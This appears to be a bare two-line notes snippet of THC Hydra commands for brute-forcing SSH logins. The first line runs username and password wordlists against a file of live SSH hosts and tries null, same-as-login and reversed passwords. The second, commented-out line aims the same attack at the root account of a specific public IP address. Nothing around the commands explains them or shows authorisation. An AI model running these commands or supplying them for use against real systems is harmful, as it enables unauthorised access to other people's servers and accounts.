hydra -L users.txt -P dic_passwd.txt -M ssh_active_host.txt -e nsr -F -t 4 -vV ssh
# hydra -l root -P dic_passwd.txt -e nsr -F -t 4 -vV ssh://202.117.3.79
